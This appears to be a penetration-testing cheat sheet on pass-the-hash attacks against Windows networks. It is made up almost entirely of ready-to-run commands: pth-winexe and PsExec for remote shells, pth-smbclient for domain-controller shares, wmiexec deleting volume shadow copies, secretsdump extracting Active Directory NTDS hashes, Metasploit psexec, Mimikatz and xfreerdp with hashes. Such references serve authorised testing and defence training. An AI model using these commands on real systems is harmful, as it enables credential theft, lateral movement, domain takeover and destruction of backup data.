# Pass the Hash - Reusing hashes



## Pass the hash - reusing hashes <a id="pass-the-hash---reusing-hashes"></a>

Pass the hash \(PTH\) is a technique that lets the user authenticate by using a valid username and the hash, instead of the unhashed password. So if you have gotten a hold of a hash you might be able to use that hash against another system.

Pass the hash is a suite of different tools.

### SMB <a id="smb"></a>

So in order to u se pass the hash we first need to put the hash in a env variable using the export command:

So we will authenticate against a smb-service.

```text
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
```

```text
pth-winexe -U administrator //192.168.1.101 cmd
```

I think you can run it like this too:

```text
pth-winexe -U admin/hash:has //192.168.0.101 cmd
```

#### More examples <a id="more-examples"></a>

```text
pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2xxxxxxxxx //10.145.X.X cmd.exe
pth-winexe -U EXAMPLE/Administrator%example@123 //10.145.X.X cmd.exe
```

[https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html)

### More PTH tools and examples <a id="more-pth-tools-and-examples"></a>

Metasploit

```text
use exploit/windows/smb/psexec
set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
```

[https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)

Command line shell on CORPSQLSERVER01

```text
pth-winexe -U corp/user_a%aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d –uninstall //corpsqlserver01 cmd.exe
```

SMB access to CORPDC01

```text
pth-smbclient //CORPDC01/c$ -U corp/user_a%aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d
```

Run commands using WMI on CORPDC01

```text
wmiexec.py –hashes aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d corp/user_a @CORPDC01 “vssadmin delete shadows /all /quiet” > ./NTDSData/rem_shadows.log
```

Acquire data from Active Directory \(ntds.dit\)

```text
secretsdump.py -just-dc-ntlm –user-status –outputfile | ./NTDSData/CORP/ntds20170711-13.05 -hashes aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d corp/user_a@corpdc01
```

Command line shell using psexec on Windows

```text
PsExec.exe -accepteula \\ corpsqlserver01 -s -u corp\user_a -p aad3b435b51404eeaad3b435b51404ee:48663e7b299fe3a7047b937804cdc34d cmd.exe
```

Mimikatz

```text
Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”
```

[https://www.sans.org/reading-room/whitepapers/testing/cracking-active-directory-passwords-how-cook-ad-crack-37940](https://www.sans.org/reading-room/whitepapers/testing/cracking-active-directory-passwords-how-cook-ad-crack-37940)

### Remote Desktop <a id="remote-desktop"></a>

```text
apt-get update
apt-get install freerdp-x11
```

```text
xfreerdp /u:admin /d:domain /pth:hash:hash /v:192.168.1.101
```

